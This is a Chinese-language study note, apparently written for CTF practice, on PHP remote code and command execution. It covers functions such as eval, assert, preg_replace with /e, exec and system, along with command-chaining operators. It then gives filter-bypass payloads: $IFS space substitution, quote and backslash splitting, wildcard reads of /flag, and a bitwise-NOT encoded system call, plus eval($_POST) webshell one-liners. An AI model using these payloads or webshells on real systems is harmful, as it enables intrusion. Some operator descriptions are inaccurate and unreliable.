---
title: RCE
date: 2026-06-09
categories:
  - 核心漏洞
tags: []
---

## 远程代码执行：

### PHP代码执行函数：

#### eval():

- 格式：eval(string $code);

- 作用：字符串按照PHP代码来计算，该字符串必须是合法的PHP代码，并且以分号结尾

```php
<?php
  eval($_POST['a']);
  ?>
  这段代码意味着后端直接接受用户通过post方法传过来的参数，并且将这个参数当成php代码执行，就可以完成很多操作了
```

#### assert()

- 格式：assert(mixed $assertion [, string $description])

- 作用：检查一个断言是否为false，如果assertion为字符串，则会被当作php字符来执行

```php
<?php
  @assert($_POST['a']);
  ?>
    
 和eval函数差不多了
```

#### preg_replace()

- 格式：

    - `$pattern`：这是要搜索的模式，可以是字符串或者字符串数组，用于指定正则表达式规则。

    - `$replacement`：是用于替换匹配内容的字符串或者字符串数组。

    - `$subject`：是要进行搜索和替换操作的目标字符串、字符串数组或者对象。

    - `$limit`：是一个可选参数，用于指定每个模式在每个 `$subject` 上进行替换的最大次数。默认值为 -1，表示不限制替换次数。

    - `$count`：也是可选参数，是一个引用变量，用于存储实际发生替换的次数。

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

- 作用：执行一个正则替换，搜索subject中匹配pattern的部分，以replacement进行替换

- 实例：

```php
<?php
  echo(preg_replace("/test/",$_POST['a'],"just test"));
  ?>
```

如果使用了/e修饰符（可执行模式），则会将替换后的字符传当作php代码执行（即eval模式）

```php
<?php
  echo(preg_replace("/test/e",$_POST['a'],"just test"));
  ?>
```

注：**php5.5版本以上被弃用**

#### call_user_func

- 格式：

    - `$callback`：这是一个必需的参数，代表要调用的回调函数。回调函数可以是一个内置函数名（以字符串形式），也可以是一个自定义函数名，还可以是一个类的方法（使用数组形式指定，如 `array($object, 'methodName')` 或 `array('ClassName', 'staticMethodName')`）。

    - `$parameter` 及后续参数：是可选参数，这些参数会作为参数传递给被调用的函数。

```php
mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
```

- 实例：

```php
<?php
function greet($name) {
    return "Hello, $name!";
}

$result = call_user_func('greet', 'John');
echo $result; 
?>
```

在上述代码中，`call_user_func` 函数调用了 `greet` 函数，并将字符串 `'John'` 作为参数传递给它，最终输出 `Hello, John!`。

可以自定义函数，直接调取数据

还有很多函数可以造成远程代码执行，需要继续学习

## 远程命令执行：

### PHP命令执行函数：

#### exec

- 格式：

    - `command`：这是必需的参数，代表要执行的系统命令，是一个字符串类型。

    - `$output`：属于可选参数，是一个数组。命令执行后，每一行的输出会作为数组的一个元素。

    - `$return_var`：同样是可选参数，是一个引用变量，用来保存命令执行后的返回状态码。

```php
string exec ( string $command [, array &$output [, int &$return_var ]] )
```

- 实例：

```php
<?php
// 执行 ls 命令（适用于 Linux 系统）
exec('ls', $output, $return_var);
foreach ($output as $line) {
    echo $line . "<br>";
}
echo "返回状态码: " . $return_var;
?>
```

在上述代码里，`exec` 函数执行了 `ls` 命令，把当前目录下的文件和文件夹列了出来。每一行的输出被存进 `$output` 数组，同时命令执行后的返回状态码被存进 `$return_var` 变量。

#### system

- 格式：

    - `$command`：这是必须要提供的参数，是要执行的系统命令。

    - `$return_var`：属于可选参数，是一个引用变量，用于存储命令执行后的返回状态码。一般而言，命令成功执行返回 0，失败则返回非零值。

    - 返回值：若命令执行成功，会返回命令输出的最后一行；若失败，就返回 `false`。

```php
system (string $commad [, int &$return_var]) : string|false
```

- 实例：

```php
<?php
// 执行系统命令 "ls -l"，此命令在 Linux 或 macOS 系统下用于列出当前目录的详细文件信息
$output = system('ls -l', $return_var);
if ($output === false) {
    echo "命令执行失败。";
} else {
    echo "命令执行成功，返回状态码: $return_var <br>";
    echo "命令输出的最后一行: $output";
}
?>
----------------------------------------------------
<?php
// 执行系统命令 "dir"，此命令在 Windows 系统下用于列出当前目录的文件和文件夹
$output = system('dir', $return_var);
if ($output === false) {
    echo "命令执行失败。";
} else {
    echo "命令执行成功，返回状态码: $return_var <br>";
    echo "命令输出的最后一行: $output";
}
?>
```

#### shell_exec

- 格式：

    - `$command`：这是必须提供的参数，代表要执行的 shell 命令。

    - 返回值：如果命令执行成功，会返回命令执行结果的完整输出内容，以字符串形式呈现；若执行失败，则返回 `null`。

```php
shell_exec ( string $command ) : string|null
```

- 实例：

```php
<?php
// 执行系统命令 "ls -l"，在 Linux 或 macOS 系统下用于列出当前目录的详细文件信息
$output = shell_exec('ls -l');
if ($output!== null) {
    echo "<pre>$output</pre>";
} else {
    echo "命令执行失败。";
}
?>
```

## Windows的RCE

系统命令执行函数：

```Plain Text
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
```

Windows系统命令拼接方式

- “|”管道符，前面的命令标准输出，后面的命令标准输入

- “&”commandA&commandB 先运行A，然后再运行B

- “&&”commandA && commandB 运行A，如果成功则运行B

- >和>> 输出重定向

    - >清楚文件中原有的内容后再输出

    - >>追加内容到文件末尾，而不会清除所有的内容。主要将本来显示在屏幕上的内容输出到指定文件中；指定的文件如果不存在，则自动生成该文件

    - < 从文件中获取输入信息，而不是从屏幕上，一般用于data ,time,label等需要等待输入的命令





## Linux

常见的命令连接符：

- ;  按顺序执行语句

- |   只执行后面的语句

- ||  如果前面的语句执行失败，则执行后面的语句，如果前面的语句执行成功，则不会执行后面的语句

- & 如果前面的语句执行失败，则执行后面的语句，否则两条语句都会执行

- && 如果前面的语句出错，则停止，否则两条语句都会执行





## 绕过的技巧：

### 过滤了cat

cat替换命令：

- more：按照页显示

- less：与more相似

- tac：与cat相反

- head：查看文件头几行

- tail：查看文件末尾几行

- nl：在cat的基础上显示行号

- od：以二进制的方式读文件， od -A -c /flag转入可读字符

- xxd：以二进制的凡事读取文件，同时有可读字符显示

- sort：排序文件

- unip：报告或者删除文件的重复行

- file -f ： 报错文件的内容

- grep：过滤查找字符串

### 过滤空格

<,<>,%20(space),%09(tab),$IFS$9,${IFS},$IFS,{cat,flag}等

直接用这些符号替换space

### 过滤运算符：

直接URL编码运算符

### 其他绕过：

```shell
c\at /flag
l\s /
//反斜杠绕过

ca""t /flag
l's' /
//引号绕过

a=fl;b=ag;cat$IFS$a$b
//拼接法

8进制
16进制
Base64
//编码绕过

cat /f???
cat /fl*
cat /f[a-z]{3}
//正则匹配绕过

```

#### 取反绕过

```php
<?php
  //取反传参
  $a = "system";
  $b = "cat /flag"
  $c = urlencode(~$a);
  $d = urlencode(~$b);

  //输出得到取反传参内容
  echo "?cmd=(~".$c.")(~".$d.")"
  ?>
```

